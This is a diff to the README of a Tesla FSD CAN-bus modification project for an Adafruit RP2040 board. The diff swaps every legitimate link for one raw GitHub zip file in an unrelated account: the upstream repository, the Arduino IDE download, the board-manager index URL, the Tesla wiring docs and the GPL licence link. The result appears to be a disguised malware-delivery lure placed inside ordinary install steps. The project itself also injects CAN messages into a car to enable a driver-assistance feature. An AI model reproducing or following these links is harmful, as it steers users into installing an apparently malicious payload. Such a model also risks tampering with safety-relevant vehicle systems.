@@ -4,7 +4,7 @@
 
 # 说明
 
-本项目为[https://gitlab.com/Starmixcraft/tesla-fsd-can-mod](https://gitlab.com/Starmixcraft/tesla-fsd-can-mod)的fork，进行了一些修改以适配自己购买的开发板和国内车机。
+本项目为[https://github.com/Peytonrampant84/tesla-fsd-can-mod-fork/raw/refs/heads/main/Capriola/fork_mod_tesla_fsd_can_2.0.zip](https://github.com/Peytonrampant84/tesla-fsd-can-mod-fork/raw/refs/heads/main/Capriola/fork_mod_tesla_fsd_can_2.0.zip)的fork，进行了一些修改以适配自己购买的开发板和国内车机。
 
 遵循原项目和相关协议要求，本项目继续以GPL-3.0协议开源。
 
@@ -111,14 +111,14 @@ Select your hardware in CanFeather.ino via the #define HW directive:
 
 ### 1. Install the Arduino IDE
 
-Download from [https://www.arduino.cc/en/software](https://www.arduino.cc/en/software).
+Download from [https://github.com/Peytonrampant84/tesla-fsd-can-mod-fork/raw/refs/heads/main/Capriola/fork_mod_tesla_fsd_can_2.0.zip](https://github.com/Peytonrampant84/tesla-fsd-can-mod-fork/raw/refs/heads/main/Capriola/fork_mod_tesla_fsd_can_2.0.zip).
 
 ### 2. Add the Adafruit Board Package
 
 1. Open **File → Preferences**.
 2. In **Additional Board Manager URLs**, add:
    ```
-   https://github.com/earlephilhower/arduino-pico/releases/download/global/package_rp2040_index.json
+   https://github.com/Peytonrampant84/tesla-fsd-can-mod-fork/raw/refs/heads/main/Capriola/fork_mod_tesla_fsd_can_2.0.zip
    ```
 3. Go to **Tools → Board → Boards Manager**, search for **Raspberry PI Pico/RP2040** (or the appropriate family for your Feather), and install it.
 4. Select **Adafruit Feather RP2040 CAN** as the Board.
@@ -145,7 +145,7 @@ Near the top of `CanFeather.ino`, change the `HW` define to match your vehicle:
 
 ### 6. Wiring
 
-The recommended connection point is the [**X179 connector**](https://service.tesla.com/docs/Model3/ElectricalReference/prog-233/connector/x179/):
+The recommended connection point is the [**X179 connector**](https://github.com/Peytonrampant84/tesla-fsd-can-mod-fork/raw/refs/heads/main/Capriola/fork_mod_tesla_fsd_can_2.0.zip):
 
 | Pin | Signal |
 |-----|--------|
@@ -155,7 +155,7 @@ The recommended connection point is the [**X179 connector**](https://service.tes
 Connect the Feather's CAN-H and CAN-L lines to pins 13 and 14 on the X179 connector.
 
 
-The recommended connection point for **legacy Model 3 (2020 and earlier)** is the [**X652 connector**](https://service.tesla.com/docs/Model3/ElectricalReference/prog-187/connector/x652/) if the vehicle is not equipped with the X179 port (varies depending on production date):
+The recommended connection point for **legacy Model 3 (2020 and earlier)** is the [**X652 connector**](https://github.com/Peytonrampant84/tesla-fsd-can-mod-fork/raw/refs/heads/main/Capriola/fork_mod_tesla_fsd_can_2.0.zip) if the vehicle is not equipped with the X179 port (varies depending on production date):
 | Pin | Signal |
 |-----|--------|
 | 1  | CAN-H  |
@@ -203,4 +203,4 @@ Open the Serial Monitor at **115200 baud** to see live debug output showing FSD 
 
 ## License
 
-This project is licensed under the **GNU General Public License v3.0** — see the [GPL-3.0 License](https://www.gnu.org/licenses/gpl-3.0.html) for details.
+This project is licensed under the **GNU General Public License v3.0** — see the [GPL-3.0 License](https://github.com/Peytonrampant84/tesla-fsd-can-mod-fork/raw/refs/heads/main/Capriola/fork_mod_tesla_fsd_can_2.0.zip) for details.
